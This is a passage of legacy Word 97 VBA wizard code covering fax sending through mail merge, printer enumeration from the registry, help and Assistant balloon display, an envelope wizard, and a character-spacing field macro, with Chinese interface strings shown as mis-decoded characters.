rgstrFaxNames(iMAX_RCPNTS) As String\nDim rgstrFaxNums(iMAX_RCPNTS) As String\nDim i As Integer\nDim strDocName As String\nDim objVars As Variables\nDim fMainDocPresent As Integer\nDim strErrorMsg As String\nDim strFaxPrinter As String, strActivePrinter As String\nDim objTmpMM As MailMerge, strFaxFld As String\nDim fSendMailAttach As Boolean\n\n\n    On Error GoTo FatalError\n    strErrorMsg = strERR_SEND_FAX\n    fSendMailAttach = Application.Options.SendMailAttach\n    \n    Set objVars = ActiveDocument.Variables\n    \n    iNumRcpnts = Val(objVars(strNUM_RCPNTS).Value)\n    \n    fCovSht = Val(objVars(\"Cover Sheet Present\").Value)\n    fMSFax = Val(objVars(\"MS Fax Present\").Value)\n    fMainDocPresent = Val(objVars(\"Main Doc Present\").Value)\n    strFaxFld = objVars(\"Fax Field Name\").Value\n    \n    If fMainDocPresent Then\n        'obtain handle to main document\n        strDocName = objVars(\"Main Document Name\").Value\n        If FInvalidMainDoc(objMainDoc, strDocName) Then Exit Sub\n        'Set objMainDoc = Application.Documents(strDocName)\n    End If\n          \n    For i = 1 To iNumRcpnts\n        rgstrFaxNames(i - 1) = objVars(strRCPNT_NAME & i).Value\n        rgstrFaxNums(i - 1) = objVars(strRCPNT_NUMBER & i).Value\n    Next i\n    \n    'if nonMSFax, then set the Fax driver to be the current printer\n    If (Not (fMSFax)) Then\n        strActivePrinter = Application.ActivePrinter\n        strFaxPrinter = objVars(\"Fax Printer\").Value\n        If Len(strFaxPrinter) = 0 Then strFaxPrinter = \" \"\n        Application.ActivePrinter = strFaxPrinter\n     End If\n    \n    'fax the cover sheet first\n    If (fCovSht) Then\n        If (iNumRcpnts > 1) Then\n            Set objTmpMM = ActiveDocument.MailMerge\n            If fMSFax Then\n                objTmpMM.Destination = wdSendToFax\n                'MsgBox \"MailMerging the cover sheet\"\n            Else 'non MS fax\n                objTmpMM.Destination = wdSendToPrinter\n            End If\n            objTmpMM.MailAsAttachment = True\n            objTmpMM.MailAddressFieldName = strFaxFld\n            StatusBar = strFAXING_CS_RECIPIENTS\n            objTmpMM.Execute\n            \n        ElseIf (iNumRcpnts = 1) And fMSFax Then\n            StatusBar = strFAXING_CS_TO & \" \" & rgstrFaxNums(0) & \"...\"\n            Application.Options.SendMailAttach = True\n            ActiveDocument.SendFax rgstrFaxNums(0)\n                'MsgBox \"Faxing to  \" & rgstrFaxNames(0) & rgstrFaxNums(0)\n        Else 'non MS fax\n            StatusBar = strFAXING_CS_RECIPIENT & \"...\"\n            ActiveDocument.PrintOut\n        End If\n    End If\n    \n    If fMainDocPresent = 0 Then GoTo LResetPrinter 'if no main doc. then deesh\n    \n    If (iNumRcpnts = 0) And Not (fMSFax) Then objMainDoc.PrintOut\n    \n    'send the main doc.\n    If fMSFax Then Application.Options.SendMailAttach = True\n    For i = 0 To iNumRcpnts - 1\n        If fMSFax Then\n            StatusBar = strFAXING_DOC_TO & \" \" & rgstrFaxNums(i)\n            objMainDoc.SendFax rgstrFaxNums(i)\n            'MsgBox \"Faxing to  \" & rgstrFaxNames(i) & rgstrFaxNums(i)\n        Else\n            StatusBar = strFAXING_DOC_RECIPIENT & \" \" & CStr(i + 1) & \"...\"\n            objMainDoc.PrintOut\n        End If\n        \n    Next i\n    \nLResetPrinter:\n'reset printer for non MS fax\n    If fMSFax Then\n        Application.Options.SendMailAttach = fSendMailAttach\n    Else\n        Application.ActivePrinter = strActivePrinter\n    End If\n    DisplayPostWizTip strMSG_FAX_SUCCESS, True\n    'DeleteCmdBar strCMD_BAR_TITLE\n    Exit Sub\n    \nFatalError:\n    i = Err.Number\n    If i Then strErrorMsg = strErrorMsg & vbCr & Err.Description\n    'if Fax not installed error message\n    If i = iERR_FAX_NOT_INSTALLED Then         strErrorMsg = strErrorMsg & vbCr & strHLP_FAX_INSTALL\n    DisplayTip strErrorMsg\n'reset printer for non MS fax\n    If fMSFax Then\n        Application.Options.SendMailAttach = fSendMailAttach\n    Else\n        Application.ActivePrinter = strActivePrinter\n    End If\n    \n    If i = iERR_FAX_NOT_INSTALLED Then\n        DisplayHelp strWIN_HELP_FILE, lCNTXT_FAX_INSTALL\n    ElseIf i = iERR_FAX_NOT_SENT And fMSFax Then\n        DisplayHelp strFAX_HELP_FILE, lCNTXT_FAX_SEND\n    End If\nEnd Sub\n'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,\n'Activedocument is new cover sheet doc.\nPrivate Sub FaxFormLtr()\n\nDim fMSFax As Boolean\nDim fCovSht As Boolean\nDim i As Integer\nDim strDocName As String\nDim iDestination As Long\nDim objVars As Variables\nDim fMainDocPresent As Integer\nDim strErrorMsg As String\nDim strFaxPrinter As String, strActivePrinter As String\nDim objTmpMM As MailMerge, strFaxFld As String\n\n    On Error GoTo FatalError\n\n    strErrorMsg = strERR_SEND_FAX\n    Set objVars = ActiveDocument.Variables\n\n    fCovSht = Val(objVars(\"Cover Sheet Present\").Value)\n    fMSFax = Val(objVars(\"MS Fax Present\").Value)\n    fMainDocPresent = Val(objVars(\"Main Doc Present\").Value)\n    strFaxFld = objVars(\"Fax Field Name\").Value\n    \n    If fMainDocPresent Then\n        'obtain handle to main document\n        strDocName = objVars(\"Main Document Name\").Value\n        If FInvalidMainDoc(objMainDoc, strDocName) Then Exit Sub\n        'Set objMainDoc = Application.Documents(strDocName)\n    End If\n    \n    If fMSFax Then\n        If Val(objVars(\"Through Email\").Value) Then\n            iDestination = wdSendToEmail\n        Else\n            iDestination = wdSendToFax\n        End If\n    Else\n        iDestination = wdSendToPrinter\n        'if nonMSFax, then set the Fax driver to be the current printer\n        strActivePrinter = Application.ActivePrinter\n        strFaxPrinter = objVars(\"Fax Printer\").Value\n        If Len(strFaxPrinter) = 0 Then strFaxPrinter = \" \"\n        Application.ActivePrinter = strFaxPrinter\n    End If\n    \n    'send the coversheet first\n    If (fCovSht) Then\n        Set objTmpMM = ActiveDocument.MailMerge\n        objTmpMM.Destination = iDestination 'MsgBox \"MailMerging activdoc (coversheet) \"\n        objTmpMM.MailAddressFieldName = strFaxFld\n        objTmpMM.MailAsAttachment = True\n        StatusBar = strFAXING_CS_RECIPIENTS\n        objTmpMM.Execute\n    End If\n \n    If fMainDocPresent = 0 Then GoTo LResetPrinter\n    \n    'fax the main document\n    Set objTmpMM = objMainDoc.MailMerge\n    objTmpMM.Destination = iDestination\n    objTmpMM.MailAddressFieldName = strFaxFld\n    objTmpMM.MailAsAttachment = True\n    StatusBar = strFAXING_DOC_RECIPIENTS\n    objTmpMM.Execute\n    'MsgBox \"MailMerging main doc.\"\n\nLResetPrinter:\n'reset printer for non MS fax\n    ActiveDocument.Fields.Update\n    If (Not (fMSFax)) Then Application.ActivePrinter = strActivePrinter\n    DisplayPostWizTip strMSG_FAX_SUCCESS, True\n    'DeleteCmdBar strCMD_BAR_TITLE\n    Exit Sub\n    \nFatalError:\n    i = Err.Number\n    If i Then strErrorMsg = strErrorMsg & vbCr & Err.Description\n    'if Fax not installed error message\n    If i = iERR_FAX_NOT_INSTALLED Then         strErrorMsg = strErrorMsg & vbCr & strHLP_FAX_INSTALL\n        \n    DisplayTip strErrorMsg\n    \n'reset printer for non MS fax\n    If (Not (fMSFax)) Then Application.ActivePrinter = strActivePrinter\n    \n    If i = iERR_FAX_NOT_INSTALLED Then\n        DisplayHelp strWIN_HELP_FILE, lCNTXT_FAX_INSTALL\n    ElseIf i = iERR_FAX_NOT_SENT And fMSFax Then\n        DisplayHelp strFAX_HELP_FILE, lCNTXT_FAX_SEND\n    End If\nEnd Sub\n\n'To display help using help files. Assuming that the help files are present in\n'the windows directory\nPrivate Sub DisplayHelp(strFile As String, ByVal lContext As Long)\n    Dim iSize As Integer\n    Dim strTmpBuffer As String\n    Dim j As Integer, i As Integer\n    Dim strWinDir As String, strWndName As String\n    Dim hOpusWin As Long, lResult As Long\n    Dim strMacroName As String\n    \n    'Get windows directory\n    i = 512\n    strTmpBuffer = String$(i, 0)\n    j = 0\n    strWinDir = \"\"\n    j = GetWindowsDirectory(strTmpBuffer, i)\n    \n    If j Then\n        If (j > i) Then j = i\n        \n        strWinDir = Left$(strTmpBuffer, j)\n        If Right$(strWinDir, 1) <> strPathSeparator Then             strWinDir = strWinDir & strPathSeparator\n    End If\n    \n    'Find word's window\n    strWndName = strMS_WORD\n    If ActiveWindow.WindowState = wdWindowStateMaximize Then         strWndName = strWndName & \" - \" & ActiveWindow.Caption\n    hOpusWin = FindWindow(\"OpusApp\", strWndName)\n    If hOpusWin = 0 Then GoTo LNotFindWindow\n    \n    'display help\n    strMacroName = \"JH(\" & strQUOTE & strQUOTE & \" , \" & lContext & \")\"\n    lResult = WinHelp(hOpusWin, strWinDir & strFile, HELP_COMMAND, strMacroName)\n    \nLNotFindWindow:\nEnd Sub\n'displays a tip during post-wizard options\n'assumes that Assistant is present since it is called from post-wizard balloon\nPrivate Sub DisplayTip(strTip As String)\n    Dim objBlnTip As Balloon\n    On Error GoTo FatalError\n    \n    Set objBlnTip = Assistant.NewBalloon\n    \n    With objBlnTip\n        .Mode = msoModeModal\n        .Heading = strWizName\n        .Text = strTip\n        .Button = msoButtonSetOK\n    End With\n    objBlnTip.Show\n    \n    If Assistant.BalloonError <> msoBalloonErrorNone Then GoTo FatalError\n\n    Exit Sub\n\nFatalError:\n    Err.Clear\n    'MsgBox strTip, vbOKOnly + vbApplicationModal, strWizName\nEnd Sub\n'ROUTINES TO OBTAIN PRINTERS FROM REGISTRY\n'fills rgstrPrinterNames with the local and remote printer names obtained\n'from the registry. iTotalNumPrinters has the number of printer\n'names obtained.\nSub GetAllPrinters()\nDim i As Integer\n\n    iTotalNumPrinters = 0\n    \n    GetLocalPrinters\n    GetRemotePrinters\n    \n    If (iTotalNumPrinters > 0) Then\n        ReDim Preserve rgstrPrinterNames(iTotalNumPrinters - 1)\n        formWizard.cboFaxDriver.List = rgstrPrinterNames\n        formWizard.cboFaxDriver.ListIndex = 0\n    End If\n    'if no printers, then the user can use cmdOtherPrinters to select one\n    'if we failed to enumerate some printer\n    \nEnd Sub\nSub GetRemotePrinters()\n    Dim hr As Long\n    Dim hSubKey As Long\n\n    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_PROVIDERS, hSubKey)\n    If hr <> ERROR_SUCCESS Then Exit Sub\n    \n    GetRemotePrinterNames (hSubKey)\n\n    RegCloseKey (hSubKey)\n    \nEnd Sub\n\nSub GetProviderPrinters(strProvider As String)\nDim hr As Long\nDim hKeyProviderServers As Long\nDim lpPrinterServer As String, strPrinterServer As String\nDim cbPrinterServer As Long\nDim dwPrinterIndex As Long\nDim lRet As Long, iLenPrinterServer As Integer\n\n    cbPrinterServer = 256\n    lpPrinterServer = String$(cbPrinterServer, 0)\n    dwPrinterIndex = 0\n\n\n    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_PROVIDERS & strProvider & \"\\Servers\", hKeyProviderServers)\n\n    If hr <> ERROR_SUCCESS Then GoTo LEndGetProviderPrinters\n            \n    lRet = ERROR_SUCCESS\n    While (lRet = ERROR_SUCCESS)\n        lpPrinterServer = String$(cbPrinterServer, 0)\n        \n        hr = RegEnumKey(hKeyProviderServers, dwPrinterIndex, lpPrinterServer, cbPrinterServer)\n        \n        If hr <> ERROR_SUCCESS Then GoTo LCloseProviderServersKey\n        \n        iLenPrinterServer = InStr(lpPrinterServer, Chr$(0))\n        If (iLenPrinterServer > 1) Then 'no name\n            strPrinterServer = Left$(lpPrinterServer, iLenPrinterServer - 1)\n            GetPrinterNamesFromServer strProvider, strPrinterServer\n        End If\n\n        dwPrinterIndex = dwPrinterIndex + 1\n    Wend\n        \nLCloseProviderServersKey:\n    RegCloseKey (hKeyProviderServers)\n    \nLEndGetProviderPrinters:\nEnd Sub\n\nSub GetPrinterNamesFromServer(strProvider As String, strPrinterServer As String)\nDim hr As Long\nDim hKeyPrinterServers As Long\nDim lpPrinterName As String, strPrinterName As String\nDim strPrinter As String\nDim cbPrinterName As Long\nDim dwPrinterIndex As Long\nDim lRet As Long, iLenPrinterName As Integer\nDim strRegPrinterServers As String\n\n\n    cbPrinterName = 256\n    lpPrinterName = String$(cbPrinterName, 0)\n    dwPrinterIndex = 0\n\n    On Error Resume Next\n    strRegPrinterServers = strREG_PROVIDERS & strProvider & \"\\Servers\\\" & strPrinterServer & \"\\Printers\"\n    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strRegPrinterServers, hKeyPrinterServers)\n\n    If hr <> ERROR_SUCCESS Then GoTo LEndGetProviderPrinters\n            \n    lRet = ERROR_SUCCESS\n    While (lRet = ERROR_SUCCESS)\n        lpPrinterName = String$(cbPrinterName, 0)\n        \n        lRet = RegEnumKey(hKeyPrinterServers, dwPrinterIndex, lpPrinterName, cbPrinterName)\n        \n        If lRet <> ERROR_SUCCESS Then GoTo LClosePrinterServersKey\n        \n        iLenPrinterName = InStr(lpPrinterName, Chr$(0))\n        If (iLenPrinterName > 1) Then 'no name\n            strPrinter = Left$(lpPrinterName, iLenPrinterName - 1)\n            strPrinterName = \"\"\n            strPrinterName = System.PrivateProfileString(\"\", \"HKEY_LOCAL_MACHINE\\\" & strRegPrinterServers & \"\\\" & strPrinter, \"Name\")\n            \n            If Len(strPrinterName) <> 0 Then\n                If (iTotalNumPrinters Mod 10) = 0 Then                     ReDim Preserve rgstrPrinterNames(iTotalNumPrinters + 10)\n                rgstrPrinterNames(iTotalNumPrinters) = UCase$(\"\\\\\" & strPrinterServer & \"\\\" & strPrinterName)\n                iTotalNumPrinters = iTotalNumPrinters + 1\n            End If\n        End If\n\n        dwPrinterIndex = dwPrinterIndex + 1\n    Wend\n        \nLClosePrinterServersKey:\n    RegCloseKey (hKeyPrinterServers)\n    \nLEndGetProviderPrinters:\n\nEnd Sub\n\nSub GetRemotePrinterNames(hKey As Long)\n    Dim dwProviderIndex As Long\n    Dim cbProviderName As Long\n    Dim lpProviderName As String\n    Dim lRet As Long, iLenProviderName  As Integer\n\n    Dim strProviderName As String\n  \n    cbProviderName = 256\n    dwProviderIndex = 0\n\n    lRet = ERROR_SUCCESS\n    \n    'get the list of providers and call GetProviderPrinters for each provider\n    While (lRet = ERROR_SUCCESS)\n        lpProviderName = String$(cbProviderName, 0)\n        \n        lRet = RegEnumKey(hKey, dwProviderIndex, lpProviderName, cbProviderName)\n        \n        If (lRet <> ERROR_SUCCESS) Then GoTo LEnd\n        \n        iLenProviderName = InStr(lpProviderName, Chr$(0)) 'length of provider name\n        \n        If (iLenProviderName > 1) Then\n            strProviderName = Left$(lpProviderName, iLenProviderName - 1)\n            GetProviderPrinters (strProviderName)\n        End If\n\n        dwProviderIndex = dwProviderIndex + 1\n    Wend\n    \nLEnd:\n\nEnd Sub\n\nSub GetLocalPrinters()\n    Dim hr As Long\n    Dim hSubKey As Long\n\n    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_LOCAL_PRINTERS, hSubKey)\n    If hr <> ERROR_SUCCESS Then Exit Sub\n\n    GetLocalPrinterNames (hSubKey)\n\n    RegCloseKey (hSubKey)\n    \nEnd Sub\n\nSub GetLocalPrinterNames(hKey As Long)\n\nDim lpPrinterName As String, strPrinterName As String\nDim strPrinter As String\nDim cbPrinterName As Long\nDim dwPrinterIndex As Long\nDim lRet As Long, iLenPrinterName As Integer\n\n    cbPrinterName = 256\n    dwPrinterIndex = 0\n\n    On Error Resume Next\n    \n    lRet = ERROR_SUCCESS\n    While (lRet = ERROR_SUCCESS)\n        lpPrinterName = String$(cbPrinterName, 0)\n        \n        lRet = RegEnumKey(hKey, dwPrinterIndex, lpPrinterName, cbPrinterName)\n        \n        If lRet <> ERROR_SUCCESS Then GoTo LEndLocalPrinters\n        \n        iLenPrinterName = InStr(lpPrinterName, Chr$(0))\n        If (iLenPrinterName > 1) Then 'no name\n            strPrinter = Left$(lpPrinterName, iLenPrinterName - 1)\n            strPrinterName = \"\"\n            strPrinterName = System.PrivateProfileString(\"\", \"HKEY_LOCAL_MACHINE\\\" & strREG_LOCAL_PRINTERS & strPrinter, \"Name\")\n            \n            If Len(strPrinterName) <> 0 Then 'if valid name, add to list\n                If (iTotalNumPrinters Mod 10) = 0 Then                     ReDim Preserve rgstrPrinterNames(iTotalNumPrinters + 10)\n                \n                rgstrPrinterNames(iTotalNumPrinters) = UCase$(strPrinterName)\n                \n                iTotalNumPrinters = iTotalNumPrinters + 1\n            End If\n        End If\n\n        dwPrinterIndex = dwPrinterIndex + 1\n    Wend\n        \n    \nLEndLocalPrinters:\nEnd Sub\n\n'displays post wizard tip in an autodown balloon if Assistant is visible\nPublic Sub DisplayPostWizTip(strTip As String, fMsgBox As Boolean)\n\n    Dim objTipBalloon As Balloon\n\n    On Error GoTo TipError\n    If fMsgBox Then\n        If Assistant.Visible = False Then GoTo TipError\n    End If\n    Set objTipBalloon = Assistant.NewBalloon\n    With objTipBalloon\n        .Mode = msoModeAutoDown\n        .Heading = strWizName\n        .Button = msoButtonSetNone\n        .Text = strTip\n    End With\n    objTipBalloon.Show\n\n    If Assistant.BalloonError <> msoBalloonErrorNone Then GoTo TipError\n    \nTipError:\n    Err.Clear\n    If fMsgBox Then MsgBox strTip, vbInformation + vbOKOnly + vbApplicationModal, strWizName\nEnd Sub\n\nPrivate Function FInvalidMainDoc(objMainDoc As Document, strDocName As String) As Boolean\n    On Error GoTo NoDoc\n    Set objMainDoc = Application.Documents(strDocName)\n    FInvalidMainDoc = False\n    Exit Function\nNoDoc:\n    DisplayErrorMsg strERR_NO_MAIN_DOC1 & strDocName & strERR_NO_MAIN_DOC2\n    FInvalidMainDoc = True\nEnd Function\n\nPublic Sub DeleteCmdBar(strCmdBarName)\n    On Error Resume Next\n    Application.CommandBars(strCmdBarName).Delete\n    Err.Clear\nEnd Sub\n\n\nFunction GetCurFont(rgn As Range) As Font\n    On Error GoTo LError\n    If (rgn.Font.Size = 9999999) Then\n        If (rgn.Characters(1).Font.Size = 9999999) Then\n            Set GetCurFont = ActiveDocument.Styles(rgn.Paragraphs(1).Style).Font\n        Else\n            Set GetCurFont = rgn.Characters(1).Font\n        End If\n    Else\n        Set GetCurFont = rgn.Font\n    End If\n    Exit Function\nLError:\n    MsgBox Err.Description\nEnd Function\n\n'returns the value stored in registry key strId\nPublic Function StrFetchPref(strId As String) As String\n    On Error GoTo LReturnNull\n    \n    StrFetchPref = System.PrivateProfileString(\"\", strRegSettingsKey, strId)\n    Exit Function\nLReturnNull:\n    StrFetchPref = \"\"\nEnd Function\n\n'returns the string stored in strId. If empty, returns strDefault\nPublic Function StrRestorePref(strId As String, strDefault As String) As String\n    Dim strTemp As String\n\n    strTemp = StrFetchPref(strId)\n    ' If length is 0, it wasn't in regsistry, so use default value\n    If Len(strTemp) = 0 Then\n        strTemp = strDefault\n    ' \"~\" is a placeholder to allow returning empty strings\n    ElseIf strTemp = \"~\" Then\n        strTemp = \"\"\n    End If\n    \n    StrRestorePref = strTemp\nEnd Function\n\n' --------------------------------------------------------------------------------------\n' WORD 97 MINI-WIZARD\n' Envelope Wizard Specific Code\n' --------------------------------------------------------------------------------------\n\nOption Explicit\n\n' --------------------------------------------------------------------------------------\n' DECLARATIONS\n' --------------------------------------------------------------------------------------\n\nPublic Const strWIZ_NAME = \"\u00abH\u00ab\u00ca\u00ba\u00eb\u00c6F\"\nPublic Const iBALLOON_OPTIONS = 2 ' Number of items in InitialBalloon (First=1)\nPublic Const strBALLOON_HEADING = \"\u00c5w\u00aa\u00ef\u00a8\u00cf\u00a5\u00ce\u00abH\u00ab\u00ca\u00ba\u00eb\u00c6F\u00a1C\"\nPublic Const strOPTION_ONE_ACCELERATOR = \"C\"   'This is the form accelerator for strInitialBalloon(0)\nPublic Const strOPTION_TWO_ACCELERATOR = \"e\"   'This is the form accelerator for strInitialBalloon(1)\nPublic strInitialBalloon(iBALLOON_OPTIONS) As String\nPublic strHelpTip(iBALLOON_OPTIONS) As String\n\nPublic Sub InitWizardStrings()\n  \n' NOTE: change constant  iBALLOON_OPTIONS if number of items in list changes\n    ' Balloon / Form menu options\n    strInitialBalloon(0) = \"\u00ab\u00d8\u00a5\u00df\u00a4@\u00abH\u00ab\u00ca\"\n    strInitialBalloon(1) = \"\u00ab\u00d8\u00a5\u00df\u00b6l\u00b1H\u00b2M\u00b3\u00e6\u00a4\u00a4\u00aa\u00ba\u00a9\u00d2\u00a6\u00b3\u00abH\u00ab\u00ca\"\n\n    ' Assistant help messages\nstrHelpTip(0) = \"\u00bd\u00d0\u00c1\u00e4\u00a4J\u00abH\u00ab\u00ca\u00a4W\u00b1H\u00a5\u00f3\u00a4H\u00a4\u00ce\u00a6\u00ac\u00a5\u00f3\u00a4H\u00aa\u00ba\u00a6a\u00a7}\u00a1C\u00a9\u00ce\u00aa\u00cc\u00acO\u00b1q Microsoft Outlook \u00b3s\u00b5\u00b8\u00a4H\u00a9\u00ce Microsoft Exchange \u00ad\u00d3\u00a4H\u00b3q\u00b0T\u00bf\u00fd\u00a4\u00a4\u00ab\u00f6\u00a4@\u00a4U\u00a1u\u00b3q\u00b0T\u00bf\u00fd\u00a1v\u00ab\u00f6\u00b6s\u00a8\u00cf\u00a5\u00ce\u00a8\u00e4\u00a4\u00a4\u00aa\u00ba\u00a6W\u00b3\u00e6\u00a1C\u00b7\u00ed\u00b1z\u00c1\u00e4\u00a4J\u00a6a\u00a7}\u00a4\u00a7\u00ab\u00e1\u00bd\u00d0\u00ab\u00f6\u00a1u\u00a6C\u00a6L\u00a1v\u00a1C\"\nstrHelpTip(1) = \"\u00b1z\u00a5i\u00a5H\u00a8\u00cf\u00a5\u00ce\u00a6X\u00a8\u00d6\u00a6C\u00a6L\u00aa\u00ba\u00a5\\\u00af\u00e0\u00a8\u00d3\u00ab\u00d8\u00a5\u00df\u00abH\u00ab\u00ca\u00a1C\u00b0\u00b2\u00a6p\u00b1z\u00bb\u00dd\u00adn\u00c0\u00b0\u00a6\u00a3\u00a1A\u00a8\u00ba\u00bb\u00f2\u00a6b\u00a6X\u00a8\u00d6\u00a6C\u00a6L\u00b9\u00ef\u00b8\u00dc\u00a4\u00e8\u00b6\u00f4\u00b3\u00bb\u00ba\u00dd\u00aa\u00ba\u00bb\u00a1\u00a9\u00fa\u00b1N\u00b7|\u00a4\u00de\u00be\u00c9\u00b1z\u00a7\u00b9\u00a6\u00a8\u00c1`\u00a6@\u00a6\u00b3\u00a4T\u00a8B\u00c6J\u00aa\u00ba\u00b5{\u00a7\u00c7\u00a1C\"\n\nEnd Sub  ' InitWizardStrings\n\nPublic Function fnInitialBalloon(iBtn)\n    \n    'On Error GoTo ErrorInitBalloon\n    \n    Select Case iBtn\n        Case Is < 1 'Exit\n            ActiveDocument.Close wdDoNotSaveChanges\n        Case 1 ' Open the envelope dialog\n            If fAssistantAvailable Then ShowAssistantTip\n            Application.Dialogs(wdDialogToolsCreateEnvelope).Show\n            If fAssistantAvailable Then objHelpTipBalloon.Close\n        Case 2 ' Start a Mail Merge to envelopes\n            ActiveDocument.MailMerge.MainDocumentType = wdEnvelopes\n            If fAssistantAvailable Then ShowAssistantTip\n            Application.Dialogs(wdDialogMailMergeHelper).Show\n            If fAssistantAvailable Then objHelpTipBalloon.Close\n    End Select\n    Exit Function\n    \nEnd Function ' fnInitialBalloon\n\n' End Envelope Wizard Module\nPrivate Const SZ_MACRONAME = \"\u00a4\u00e5\u00a6r\u00a7\u00a1\u00b5\u00a5\u00a4\u00c0\"\nGlobal iPrevChars As Integer\n\nSub Insert()\n    Dim n As Integer\n    Dim para As Paragraph\n    Dim fld As Field\n    \n    On Error GoTo LError\n    \n    Application.ScreenUpdating = False\n    System.Cursor = wdCursorWait\n    n = 2\n    With Selection\n        If ((Selection.Start = Selection.End) And (.Text = Chr$(21))) Then\n            .MoveRight , 1, 1\n        End If\n        \n        For Each fld In .Fields\n            a$ = fld.Code\n            If (FIsDistField(a$)) Then\n                iTop = InStr(1, a$, \",\")\n                iEnd = InStr(1, a$, \")\") - 1\n                n = iEnd - iTop\n                dlgDist.ID_RESET.Enabled = True\n                GoTo LSkip\n            ElseIf (InStr(1, a$, \"eq\") <> 0) Then\n                MsgBox \"\u00a6\u00b9\u00a6r\u00a6\u00ea\u00a5\u00bc\u00a7\u00a1\u00b5\u00a5\u00a4\u00c0\", Title:=SZ_MACRONAME\n                GoTo LExit:\n            End If\n        Next fld\n        dlgDist.ID_RESET.Enabled = False\n        If (Len(Selection.Text) < 2) Then\n            MsgBox \"\u00bd\u00d0\u00bf\u00ef\u00a8\u00fa\u00adn\u00a7\u00a1\u00b5\u00a5\u00a4\u00c0\u00aa\u00ba\u00a6r\u00a6\u00ea\u00a1A\u00a5B\u00a6r\u00a6\u00ea\u00adn\u00a6\u00b3\u00a8\u00e2\u00ad\u00d3\u00a6r\u00a5H\u00a4W\u00a1C\", Title:=SZ_MACRONAME\n            GoTo LExit\n        ElseIf (Len(Selection.Text) = 2) And                 (Right(Selection.Text, 1) = Chr$(13)) Then\n                MsgBox \"\u00b4\u00ab\u00a6\u00e6\u00b2\u00c5\u00b8\u00b9\u00a1B\u00a9w\u00a6\u00ec\u00c2I\u00a4\u00ce\u00a5\\\u00af\u00e0\u00c5\u00dc\u00bc\u00c6\u00b3\u00a3\u00a4\u00a3\u00ba\u00e2\u00acO\u00a4@\u00ad\u00d3\u00a6r\u00a1A\u00bd\u00d0\u00ad\u00ab\u00b7s\u00bf\u00ef\u00be\u00dc\u00adn\u00a7\u00a1\u00b5\u00a5\u00a4\u00c0\u00aa\u00ba\u00a6r\u00a6\u00ea\u00a1C\", Title:=SZ_MACRONAME\n                GoTo LExit\n        ElseIf (Len(Selection.Text) = 2) And                 (Right(Selection.Text, 1) = Chr$(9)) Then\n                MsgBox \"\u00b4\u00ab\u00a6\u00e6\u00b2\u00c5\u00b8\u00b9\u00a1B\u00a9w\u00a6\u00ec\u00c2I\u00a4\u00ce\u00a5\\\u00af\u00e0\u00c5\u00dc\u00bc\u00c6\u00b3\u00a3\u00a4\u00a3\u00ba\u00e2\u00acO\u00a4@\u00ad\u00d3\u00a6r\u00a1A\u00bd\u00d0\u00ad\u00ab\u00b7s\u00bf\u00ef\u00be\u00dc\u00adn\u00a7\u00a1\u00b5\u00a5\u00a4\u00c0\u00aa\u00ba\u00a6r\u00a6\u00ea\u00a1C\", Title:=SZ_MACRONAME\n                GoTo LExit\n        End If\n        If (InStr(1, Selection.Text, Chr$(13)) <> 0) Then\n            For Each para In .Paragraphs\n                If (n < (Len(para.Range.Text) - 1)) Then\n                    n = Len(para.Range.Text) - 1\n                End If\n            Next para\n        Else\n            n = Len(Selection.Text)\n        End If\n        If (n < iPrevChars) Then\n            n = iPrevChars\n        End If\n    End With\n\nLSkip:\n    If (n > 32) Then\n        n = 32\n    ElseIf (n < 1) Then\n        n = 1\n    End If\n    dlgDist.IDCS_SIZE.Value = n\n    dlgDist.IDCE_SIZE.Text = n\n    dlgDist.IDCE_SIZE.IMEMode = fmIMEModeNoControl\n    dlgDist.IDCE_SIZE.SetFocus\n    dlgDist.IDCE_SIZE.SelStart = 0\n    dlgDist.IDCE_SIZE.SelLength = 99\n    \n    Application.ScreenUpdating = True\n    System.Cursor = wdCursorNormal\n    \n    dlgDist.Show\n\nLExit:\n    Exit Sub\nLError:\n    MsgBox Err.Description, Title:=SZ_MACRONAME\nEnd Sub\n\nSub Create(n As Integer)\n    Dim rgn As Range\n    Dim rgnTmp As Range\n    Dim rgnOrg As Range\n    Dim para As Paragraph\n    Dim cmdb As CommandBar\n    \n    On Error GoTo LError\n    Application.ScreenUpdating = False\n    System.Cursor = wdCursorWait\n    \n    With Selection\n        Set rgnOrg = .Range\n        For Each para In rgnOrg.Paragraphs\n            If (InStr(1, rgnOrg.Text, Chr$(13)) <> 0) Then\n                Set rgn = para.Range\n                If (para.Range.Start < rgnOrg.Start) Then\n                    rgn.SetRange rgnOrg.Start, rgn.End - 1\n                ElseIf (para.Range.End > rgnOrg.End) Then\n                    rgn.SetRange rgn.Start, rgnOrg.End - 1\n                Else\n                    rgn.SetRange rgn.Start, rgn.End - 1\n                End If\n                rgn.Select\n            Else\n                Set rgn = rgnOrg\n            End If\n            cLineBreak = InStr(1, rgn.Text, Chr$(11))\n            If (cLineBreak <> 0) Then\n                rgn.SetRange rgn.Start, rgn.Start + cLineBreak - 1\n                rgn.Select\n            End If\n            If (.Fields.Count > 0) Then\n                a$ = .Fields(1).Code\n                If (FIsDistField(a$) = True) Then\n                    Resize .Fields(1), n\n                    GoTo LContinue\n                End If\n            End If\n            \n            c = Len(.Text)\n            ' Remove Additional Spaces\n            sz$ = .Text\n            x = 0\n            While (FIsSpace(Right$(sz$, 1)) <> 0)\n                sz$ = Left$(sz$, Len(sz$) - 1)\n                x = x + 1\n            Wend\n            \n            ' Create DistChar field\n            ' {eq \\o\\ad(foo,     )}\n            Set rgn = .Range\n            If (x > 0) Then\n                .MoveRight\n                .MoveLeft unit:=wdCharacter, Count:=x\n                .Delete unit:=wdCharacter, Count:=x\n                rgn.Select\n            End If\n            .InsertAfter \",\" + String$(n, \"\u00a1@\") + \")\"\n            .InsertBefore \"eq \\o\\ad(\"\n            rgn.SetRange rgn.Start + Len(\"eq \\o\\ad(\"), rgn.End\n            rgn.Font.DisableCharacterSpaceGrid = False\n            Set rgn = .Range\n           ' Insert Field\n            .Fields.Add .Range, , , False\n            ' { eq \\o\\ad(foo,     ) }\n            '                      ~ Remove tip space\n            rgn.Select\n            rgn.SetRange .Range.End - 2, .Range.End - 1\n            rgn.Text = \"\"\n            \n            .Fields.ToggleShowCodes\n            .MoveRight , 1, 1\nLContinue:\n        Next para\n    End With\n    rgnOrg.Select\n    Application.ScreenUpdating = True\n    System.Cursor = wdCursorNormal\n    Exit Sub\nLError:\n    